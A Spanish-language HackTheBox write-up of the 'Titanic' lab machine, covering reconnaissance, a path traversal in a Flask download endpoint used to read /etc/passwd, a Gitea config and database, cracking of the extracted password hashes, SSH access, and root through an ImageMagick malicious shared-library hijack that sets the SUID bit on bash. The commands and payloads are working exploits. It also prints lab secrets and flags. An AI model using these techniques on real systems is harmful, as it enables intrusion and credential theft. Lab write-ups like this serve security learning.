---
icon: flag
---

# Titanic HackTheBox

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 16:39 EST
Nmap scan report for 10.10.11.55
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.22 seconds
```

Si entramos en la pagina, vemos que esta intentando acceder a un dominio llamado `titanic.htb`, por lo que tendremos que meterlo en el archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>         titanic.htb
```

Lo guardamos y volvemos a recargar la pagina, ahora veremos que carga todo de forma correcta, pero no encontraremos gran cosa, por lo que vamos a ver si contuviera algun `subdominio`.

## FFUF

```shell
ffuf -c -w <WORDLIST> -u http://titanic.htb -H "Host: FUZZ.titanic.htb" -fw 20
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 42ms]
:: Progress: [20469/20469] :: Job [1/1] :: 423 req/sec :: Duration: [0:00:31] :: Errors: 0 ::
```

Vemos que efectivamente hemos encontrado un `subdominio` llamado `dev`, por lo que haremos lo siguiente.

Vamos a meter en el archivo `hosts` de nuevo el `subdominio` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>         titanic.htb dev.titanic.htb
```

Lo guardamos y ahora lo ponemos en la `URL`:

```
URL = http://dev.titanic.htb/
```

Veremos esta pagina:

<figure><img src="../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

Si nos registramos en la pagina y exploramos un poco encontraremos bastantes cosas interesante en los repositorios del usuario `developer`, pero entre ellos si nos vamos al siguiente repositorio en esta ruta del codigo de la `app.py` veremos esto:

```
URL = http://dev.titanic.htb/developer/flask-app/src/branch/main/app.py
```

```python
from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

TICKETS_DIR = "tickets"

if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

Veremos que hay una vulnerabilidad de un `Path Traversal` en la seccion de `/download`.

### **Vulnerabilidad: Directory Traversal en `/download`**

***

#### **¿Qué es Directory Traversal?**

Es un tipo de vulnerabilidad que permite a un atacante acceder a archivos fuera del directorio permitido explotando rutas relativas (`../`).

En este caso, la aplicación Flask permite descargar archivos desde la carpeta `tickets/`, pero no valida correctamente el nombre del archivo proporcionado por el usuario.

**Ubicación de la vulnerabilidad en el código:**

```python
@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')  # <--- Entrada no validada del usuario
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)  # <--- Ruta sin sanitizar

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)  # <--- Envía cualquier archivo
    else:
        return jsonify({"error": "Ticket not found"}), 404
```

📌 **Problema:**

* `ticket` proviene directamente del usuario **sin validación**.
* `os.path.join(TICKETS_DIR, ticket)` no impide que el usuario use `../` para salir del directorio.
* Un atacante puede descargar **cualquier archivo del sistema** al que el servidor tenga acceso.

***

### **¿Cómo se puede explotar?**

#### **Ejemplo 1: Obtener el archivo `/etc/passwd` en Linux**

Si el servidor está en Linux, un atacante puede usar `curl` para intentar descargar el archivo de contraseñas del sistema:

```shell
curl "http://titanic.htb/download?ticket=../../../../etc/passwd" -o passwd.txt
```

🔍 **Explicación:**

* `../../../../etc/passwd` hace que la ruta se convierta en:

```
tickets/../../../../etc/passwd  →  /etc/passwd
```

* Si el servidor tiene permisos para leer `/etc/passwd`, **devolverá el archivo con los nombres de usuario del sistema.**

#### **Ejemplo 2: Descargar archivos del código fuente del servidor**

Si el servidor está almacenando sus propios archivos en `/var/www/app/`, un atacante podría intentar descargar el código fuente con:

```shell
curl "http://titanic.htb/download?ticket=../../app.py" -o app.py
```

Si tiene éxito, **el atacante obtiene el código completo de la aplicación**, lo que le permite buscar más vulnerabilidades.

#### **Ejemplo 3: Leer archivos de configuración sensibles**

Si hay un archivo `.env` con credenciales en el servidor, el atacante podría intentar obtenerlo:

```shell
curl "http://titanic.htb/download?ticket=../../.env" -o env.txt
```

Este archivo suele contener **contraseñas de bases de datos y claves API**.

***

Por lo que vamos a realizar lo siguiente para ver que contiene el `passwd` y comprobar que funciona:

```shell
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Como vemos nos esta volcando de forma correcta el `passwd`, pero si nos vamos a la documentacion de `gitea` podremos ver lo siguiente:

URL = [Info Gitea](https://docs.gitea.com/installation/install-with-docker#basics)

```shell
# SSH pubkey from git user
ssh-rsa <Gitea Host Key>

# other keys from users
command="/usr/local/bin/gitea --config=/data/gitea/conf/app.ini serv key-1",no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty <user pubkey>
```

Vemos una ruta de configuracion de una aplicacion y con suerte puede que este por defecto como en la documentacion, por lo que vamos a probarlo de la siguiente forma:

```shell
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/conf/app.ini"
```

Info:

```
APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g
```

Vemos que nos funciono y vemos una seccion interesante que mirar que seria esta siguiente:

```
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable
```

Por lo que vamos a descargarnoslo:

```shell
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" --output gitea.db
```

## sqlite3

Ahora vamos a utilizar la herramienta `sqlite3`:

```shell
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee hash.txt
```

Info:

```
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Veremos que obtenemos los nombres de usuarios con sus `hashes` por lo que tendremos que `crackear` del del usuario `developer` que es el que nos interesa.

#### **Proceso para preparar hashes de contraseñas con salts para usar con Hashcat**

Cuando se tiene acceso a una base de datos (como `gitea.db`), podemos extraer los hashes de contraseñas y sus respectivos **salts** de los usuarios para crackear las contraseñas con herramientas como **Hashcat**. Para hacerlo correctamente, es necesario transformar los datos a un formato adecuado. Aquí te explico cómo hacerlo paso a paso.

***

#### **1. Obtener los datos desde la base de datos**

Usamos **SQLite** para extraer las columnas necesarias (`passwd`, `salt`, y `name`) de la tabla `user` en la base de datos.

Comando:

```
sqlite3 gitea.db "select passwd,salt,name from user"
```

Este comando devuelve tres columnas:

* **passwd**: El hash de la contraseña en formato hexadecimal.
* **salt**: El salt utilizado en el proceso de hashing, también en formato hexadecimal.
* **name**: El nombre del usuario.

***

#### **2. Procesar cada línea de los resultados**

Para trabajar con cada fila obtenida, usamos un bucle `while` que lee cada línea y realiza las transformaciones necesarias.

Comando:

```shell
| while read data;
```

Este comando se asegura de procesar una por una todas las líneas de los resultados obtenidos de la base de datos.

***

#### **3. Convertir el hash y el salt a formato Base64**

Los valores del hash y el salt generalmente están en formato hexadecimal, pero Hashcat espera que estos valores estén en formato **Base64**. Por lo tanto, necesitamos hacer una conversión.

Comando para el **hash**:

```shell
digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64)
```

Comando para el **salt**:

```shell
salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64)
```

#### **Explicación**:

* **`cut -d'|' -f1`**: Extrae la primera parte de la línea (el hash), dividiendo por el delimitador `|`.
* **`xxd -r -p`**: Convierte el valor hexadecimal (hash/salt) a su formato binario.
* **`base64`**: Convierte los datos binarios a formato Base64.

Esto hace que tanto el hash como el salt sean compatibles con el formato que Hashcat necesita para procesarlos correctamente.

***

#### **4. Extraer el nombre del usuario**

También necesitamos obtener el nombre del usuario para asociarlo con su hash de contraseña.

Comando:

```shell
name=$(echo $data | cut -d'|' -f3)
```

Este comando extrae la tercera parte de la línea (el nombre del usuario).

***

#### **5. Formato para Hashcat**

Ahora generamos el formato adecuado que Hashcat puede utilizar para intentar crackear las contraseñas. El formato es:

```ruby
<usuario>:sha256:<iteraciones>:<salt>:<hash>
```

Comando para generar el formato:

```shell
echo "${name}:sha256:50000:${salt}:${digest}"
```

#### **Explicación**:

* **`${name}`**: El nombre del usuario.
* **`sha256`**: El algoritmo de hash que se usó (en este caso, SHA-256).
* **`50000`**: El número de iteraciones utilizadas en el hashing (esto es común en hashes modernos como PBKDF2). Este número puede variar dependiendo de la implementación de la base de datos.
* **`${salt}`**: El salt en formato Base64.
* **`${digest}`**: El hash de la contraseña en formato Base64.

#### **¿Por qué hacer estas conversiones?**

* **Hashcat** requiere los hashes y los salts en formato Base64, por lo que es necesario convertirlos desde su formato hexadecimal original a Base64.
* **El número de iteraciones** (50000 en este caso) es importante para hacer el proceso de cracking más realista, ya que muchos algoritmos de hashing modernos incluyen múltiples iteraciones para mejorar la seguridad de las contraseñas.

Este proceso es común para trabajar con hashes y salts de bases de datos que utilizan algoritmos como **PBKDF2-SHA256**.

## Escalate user developer

### Hashcat

```shell
hashcat hash.txt <WORDLIST> --user
```

Info:

```
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i7-12700H, 2913/5891 MB (1024 MB allocatable), 8MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q

                                                          
Session..........: hashcat
Status...........: Quit
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: gitea.hashes
Time.Started.....: Sat Feb 22 17:44:00 2025 (47 secs)
Time.Estimated...: Sun Feb 23 19:56:19 2025 (1 day, 2 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      608 H/s (8.18ms) @ Accel:256 Loops:128 Thr:1 Vec:8
Recovered........: 1/5 (20.00%) Digests (total), 1/5 (20.00%) Digests (new), 1/5 (20.00%) Salts
Progress.........: 26624/71721925 (0.04%)
Rejected.........: 0/26624 (0.00%)
Restore.Point....: 4096/14344385 (0.03%)
Restore.Sub.#1...: Salt:3 Amplifier:0-1 Iteration:42112-42240
Candidate.Engine.: Device Generator
Candidates.#1....: newzealand -> iheartyou
Hardware.Mon.#1..: Util: 91%

Started: Sat Feb 22 17:43:27 2025
Stopped: Sat Feb 22 17:44:48 2025
```

Por lo que vemos hemos obtenido la contraseña, por lo que nos meteremos por `SSH` mediante las credenciales:

```
User: developer
Pass: 25282528
```

### SSH

```shell
ssh developer@<IP>
```

Metemos como contraseña `25282528` y veremos que estamos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
cac7d5645963a2eae1d90fb07d6d3e46
```

## Escalate Privileges

Si nos vamos a la carpeta `/opt` veremos una carpeta llamada `/app` que si nos metemos dentro veremos la aplicacion, pero en la carpeta `tickets` vemos que tenemos permisos para escribir:

```
drwxrwx--- 2 root developer 4096 Feb 24 17:25 tickets
```

Si nos metemos dentro veremos todos los `.json` de la base de datos, pero si nos volvemos atras, donde la `/app` nos vamos a `static/assets/images`, veremos que aqui tambien podemos escribir en esta carpeta.

Por lo que vemos esto es bastante interesante, pero si nos vamos a la siguiente ruta:

```shell
cd /opt/scripts
```

Veremos que hay un script en `bash` que si leemos que contiene, veremos esto:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Vemos que esta utilizando una herramienta llamada `magick` que es famosa por tener una vulnerabilidad para leer ficheros del sistema, por lo que vamos a ver si funciona.

URL = [Exploit magick](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8)

Si nos vamos a esta seccion:

```shell
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```

Veremos que donde pone `id` pondremos el comando que queremos que se ejecute a nuestro gusto, en mi caso pondre lo siguiente:

```shell
cd /opt/app/static/assets/images
```

```shell
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("chmod u+s /bin/bash");
    exit(0);
}
EOF
```

Y solo tendremos que esperar un ratito, una vez esperado haremos lo siguiente para ver si funciono:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Con esto veremos que ha funcionado, por lo que haremos lo siguiente:

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Y con esto ya seremos `root`, por lo que leeremos la flag de `root`.

> root.txt

```
79cbfb3408f739a361f35067bb99d1b3
```
